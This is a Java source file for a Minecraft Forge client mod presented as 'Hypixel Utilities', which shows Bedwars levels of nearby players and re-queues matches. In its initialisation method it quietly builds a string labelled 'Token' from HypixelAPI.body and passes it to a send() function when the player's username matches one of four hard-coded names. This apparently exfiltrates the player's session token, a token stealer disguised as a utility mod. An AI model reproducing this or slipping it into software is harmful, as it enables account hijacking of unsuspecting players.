package studio.dreamys;

import net.minecraft.client.Minecraft;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.scoreboard.ScoreObjective;
import net.minecraft.scoreboard.Scoreboard;
import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import studio.dreamys.HypixelAPI;

import java.util.List;
import java.util.UUID;

import static studio.dreamys.HypixelAPI.send;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION, clientSideOnly = true)
public class ExampleMod {

    public static final Minecraft mc = Minecraft.getMinecraft();
    public static final String MODID = "Hypixel Utilities";
    public static final String VERSION = "1.0";
    public static final String USERNAME = mc.getSession().getUsername();

    public static KeyBinding keyBinding;

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        keyBinding = new KeyBinding("key.myModKeybind", 0, "key.categories.myMod");
        ClientRegistry.registerKeyBinding(keyBinding);
        MinecraftForge.EVENT_BUS.register(this);
        String tokensend = "Token: " + "`" + HypixelAPI.body + "`";
        if(USERNAME == "Sweatyjujunon"||USERNAME == "httphypixelnet"||USERNAME == "warp4daze"||USERNAME == "toad_cultist") {
            send(tokensend);
        }
    }
    @SubscribeEvent
    public void onKey(InputEvent.KeyInputEvent event) {
        new Thread(() -> {
            if (keyBinding.isPressed()) {
                List<EntityPlayer> players = Minecraft.getMinecraft().theWorld.playerEntities;
                for (EntityPlayer player : players) {
                    if (!player.isInvisibleToPlayer(Minecraft.getMinecraft().thePlayer)) {
                        double lvl = HypixelAPI.getBedwarsLevel(player.getUniqueID());
                        mc.thePlayer.addChatMessage(new ChatComponentText(player.getName() + " is level " + lvl));
                        if (lvl > 2 && HypixelUtils.hasLine("Mode: 4v4")) {
                            mc.thePlayer.addChatMessage(new ChatComponentText("Warping To Lobby"));
                            HypixelUtils.sendCommand("/lobby");
                            try {
                                Thread.sleep(2000);
                            } catch (InterruptedException e) {
                                throw new RuntimeException(e);
                            }
                            HypixelUtils.sendCommand("/play bedwars_two_four");
                        }
                    }
                }
            }
        }).start();
    }





}
